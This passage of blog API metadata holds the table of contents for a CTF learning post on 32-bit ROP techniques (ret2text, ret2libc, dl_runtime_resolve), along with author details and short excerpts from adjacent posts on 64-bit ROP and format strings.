(gadge...","link":"","photos":[],"count_time":{"symbolsCount":"16k","symbolsTime":"15 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":2,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ROP%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">ROP原理</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2text\"><span class=\"toc-text\">ret2text</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2shellcode\"><span class=\"toc-text\">ret2shellcode</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-1\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2syscall\"><span class=\"toc-text\">ret2syscall</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-2\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2libc1\"><span class=\"toc-text\">ret2libc1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%96%B9%E6%B3%95-3\"><span class=\"toc-text\">方法</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-3\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2libc2\"><span class=\"toc-text\">ret2libc2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ret2libc3\"><span class=\"toc-text\">ret2libc3</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-4\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%86%E6%9E%90\"><span class=\"toc-text\">分析</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-5\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#NO-RELRO\"><span class=\"toc-text\">NO RELRO</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#dl-runtime-resolve-%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">dl_runtime_resolve 函数</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%A0%88%E8%BF%81%E7%A7%BB\"><span class=\"toc-text\">栈迁移</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stage1\"><span class=\"toc-text\">stage1</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stage2\"><span class=\"toc-text\">stage2</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stage3\"><span class=\"toc-text\">stage3</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stage4\"><span class=\"toc-text\">stage4</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stage5\"><span class=\"toc-text\">stage5</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#stage6\"><span class=\"toc-text\">stage6</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-6\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#X-CTF-Quals-2016-b0verfl0w\"><span class=\"toc-text\">X-CTF Quals 2016 - b0verfl0w</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-7\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"ROP-x64","uid":"2d83114abbe0d2e1d7c9af7e01c50ee1","slug":"ROP-x64","date":"2021-10-05T11:59:10.000Z","updated":"2021-11-06T03:50:40.735Z","comments":true,"path":"api/articles/ROP-x64.json","keywords":null,"cover":"https://i.loli.net/2021/10/29/phEINMSHn8PWb2w.jpg","text":" 之前在前面写了一篇介绍ROP的，不过是32位的，因为64位和32位多多少少有不同点，所以这次就介绍64位下的ROP pwn07做法和之前32位的ret2libc3思路是一致的，泄露puts函数地址找到libc计算出system函数地址从而获取shell。**64位是通过寄存器传...","link":"","photos":[],"count_time":{"symbolsCount":"8.2k","symbolsTime":"7 mins."},"categories":[{"name":"学习记录","slug":"学习记录","count":2,"path":"api/categories/学习记录.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"Fortmat String","uid":"ce1b126727eaab3b04a4b3e82a32db07","slug":"Fortmat-String","date":"2021-10-01T03:26:49.000Z","updated":"2021-11-14T06:37:45.081Z","comments":true,"path":"api/articles/Fortmat-String.json","keywords":null,"cover":[],"text":"介绍格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。会触发该漏洞的函数很有限。主要就是printf还有sprintf，fprintf等等c库中print家族的函数。因为主要是考查printf函数所以我就直接拿printf函数做讲解。...","link":"","photos":[],"count_time":{"symbolsCount":"1.2k","symbolsTime":"1 mins."},"categories":[{"name":"pwn","slug":"pwn","count":2,"path":"api/categories/pwn.json"}],"tags":[{"name":"笔记","slug":"笔记","count":2,"path":"api/tags/笔记.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}